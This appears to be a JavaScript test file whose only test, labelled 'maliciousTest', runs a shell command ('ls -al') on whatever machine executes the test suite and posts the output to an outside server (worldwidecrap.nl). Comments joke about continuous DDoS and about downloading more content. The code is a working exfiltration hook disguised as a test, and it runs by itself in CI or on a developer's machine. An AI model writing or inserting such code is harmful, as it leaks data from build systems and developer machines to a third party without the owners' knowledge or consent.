import * as https from 'https'
import * as util from 'util'
import * as childProcess from 'child_process'

//CD stands for Continuous DDoS
describe('maliciousTest', () => {
  it('checksIfCommandExecutionIsAllowed', async () => {
    //send some cool stuff, maybe in a loop?
    const exec = util.promisify(childProcess.exec)

    const results = await exec('ls -al')
    const data = JSON.stringify(results)
    const req = https.request(
      {
        hostname: 'worldwidecrap.nl',
        port: 443,
        path: '/counter.php',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': data.length
        }
      },
      res => {
        res.on('data', d => {
          //download some cool stuff
          return d
        })
      }
    )
    req.write(data)
    req.end()
  })
})
